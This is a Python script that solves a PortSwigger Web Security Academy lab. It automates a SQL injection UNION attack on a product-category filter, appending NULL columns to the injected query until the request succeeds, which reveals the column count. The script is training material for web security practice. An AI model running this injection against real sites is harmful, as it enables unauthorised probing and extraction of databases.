#!/usr/bin/env python3
import requests
import functools
from dataclasses import dataclass, field
from typing import Any
import sys


# Disable warnings generated due to unverified SSL connections
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

"""
Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
To solve the lab, perform an SQL injection UNION attack that returns an additional row containing null values.
"""


@dataclass()
class Validator:
    """Validate Requests Objects"""
    request: Any

    def __post_init__(self):
        functools.update_wrapper(self, self.request)

    def __call__(self, *args, **kwargs):
        response = self.request(*args, **kwargs)

        try:
            response.raise_for_status()
        except requests.exceptions.HTTPError:
            if response.status_code == 404:
                help_msg = 'The session you are looking for has expired.'
                sys.exit(f'{response.status_code}: {response.reason}. {help_msg}')
        except requests.exceptions.ConnectionError as error:
            help_msg = 'Please make sure you are using a valid URL.'
            sys.exit(f'{help_msg}\n{error}')
        except requests.exceptions.Timeout:
            help_msg = 'Request timed out. This may be due to using an outdated lab URL.'
            sys.exit(f'{help_msg}')
        except requests.exceptions.RequestException as error:
            help_msg = 'Caught general exception:'
            sys.exit(f'{help_msg} {error}')
        return response


requests.Session.request = Validator(requests.Session().request)


@dataclass()
class Injection:
    lab_url: str = field()
    parameters: dict = field(default_factory=dict)
    session: requests.Session = field(default=requests.Session())
    null: list = field(default_factory=list)

    def __post_init__(self):
        self.lab_url = f'{self.lab_url}filter' if self.lab_url.endswith('/') else f'{self.lab_url}/filter'
        self.null = ["'UNION SELECT", 'NULL', '--']
        self.parameters['category'] = f"Lifestyle{' '.join(self.null)}"

    def null_logic(self):
        response = self.session.get(url=self.lab_url, params=self.parameters, timeout=5)

        while not response.ok:
            # Remove '--' then add ', NULL --' until response.ok is True
            self.null.remove('--')
            self.null.extend([',', 'NULL', '--'])
            self.parameters['category'] = f"Lifestyle{' '.join(self.null)}"
            response = self.session.get(url=self.lab_url, params=self.parameters)


if __name__ == '__main__':
    lab_url = 'https://abcd.web-security-academy.net/'

    sqli = Injection(lab_url=lab_url)
    sqli.null_logic()

    print(f"There are {sqli.null.count('NULL')} columns.")
